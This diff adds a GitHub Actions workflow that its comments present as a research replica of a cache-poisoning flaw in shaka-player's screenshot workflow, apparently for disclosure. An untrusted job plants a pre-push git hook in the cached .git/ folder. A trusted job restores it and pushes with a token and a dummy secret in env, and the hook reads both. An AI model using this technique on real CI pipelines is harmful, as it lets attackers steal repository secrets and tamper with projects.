@@ -1,0 +1,88 @@
+# Security-research replica of shaka-project/shaka-player
+# .github/workflows/update-screenshots.yaml (pinned 59c7fb75):
+# two-job structure — untrusted job saves .git/ to actions/cache, trusted job
+# restores it over a clean checkout and pushes with a secret in env.
+# Victim secret is a dummy. This repo contains no real credentials.
+
+name: Cache Replica
+
+on:
+  workflow_dispatch:
+
+jobs:
+  # Replica of shaka's "commit-new-screenshots" (untrusted):
+  # "NOTE: NO PERMISSIONS ON THIS JOB. It runs PR-author-controlled code"
+  commit-new-screenshots:
+    name: Commit New Screenshots (untrusted replica)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          persist-credentials: false
+
+      - name: Simulated PR-author-controlled code (npm ci of the PR in the real attack)
+        run: |
+          set -e
+          # In the real attack the payload arrives inside the PR (npm postinstall,
+          # ./build/updateScreenshots.py) and runs with full write access to .git/.
+          cat > .git/hooks/pre-push <<'HOOK'
+          #!/bin/sh
+          echo "[HOOK-FIRED] pre-push hook from attacker-crafted .git executed in TRUSTED job"
+          if [ -n "$GH_TOKEN" ]; then
+            echo "[GH_TOKEN-IN-ENV] present, length=${#GH_TOKEN}, prefix=${GH_TOKEN:0:4}****"
+          else
+            echo "[GH_TOKEN-IN-ENV] NOT SET"
+          fi
+          if [ -n "$FAKE_BOT_TOKEN" ]; then
+            H=$(printf %s "$FAKE_BOT_TOKEN" | sha256sum | cut -c1-16)
+            echo "[VICTIM-SECRET-CAPTURED] FAKE_BOT_TOKEN present, length=${#FAKE_BOT_TOKEN}, sha256[:16]=$H (real attack: exfiltrated to attacker server)"
+          else
+            echo "[VICTIM-SECRET-CAPTURED] FAKE_BOT_TOKEN NOT SET"
+          fi
+          exit 0
+          HOOK
+          chmod +x .git/hooks/pre-push
+          git config user.name "replica-bot"
+          git config user.email "replica-bot@users.noreply.github.com"
+          echo "replica $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> replica.txt
+          git add replica.txt
+          git commit -m "replica: update screenshots" || true
+          echo "hook staged: $(ls -l .git/hooks/pre-push)"
+
+      - name: Cache Commits
+        uses: actions/cache/save@v4
+        with:
+          path: .git/
+          key: replica-commits-${{ github.sha }}
+
+  # Replica of shaka's "manage-pr" (trusted): holds the victim secret,
+  # checkout -> cache restore of .git/ -> gh auth setup-git -> git push.
+  manage-pr:
+    name: Manage PR (trusted replica — holds the secret)
+    runs-on: ubuntu-latest
+    needs: [commit-new-screenshots]
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          persist-credentials: false
+
+      - name: Restore Commits
+        uses: actions/cache/restore@v4
+        with:
+          path: .git/
+          key: replica-commits-${{ github.sha }}
+
+      - name: Show restored hook
+        run: |
+          echo "restored .git/hooks/pre-push:"; ls -l .git/hooks/pre-push; head -2 .git/hooks/pre-push
+
+      - name: Push with victim secret in env
+        env:
+          GH_TOKEN: ${{ github.token }}
+          FAKE_BOT_TOKEN: ${{ secrets.FAKE_BOT_TOKEN }}
+        run: |
+          gh auth setup-git
+          git push "https://github.com/$GITHUB_REPOSITORY.git" HEAD:refs/heads/replica-branch 2>&1 | tee push-output.txt
+          echo "--- evidence: hook output is captured in push-output.txt above ---"
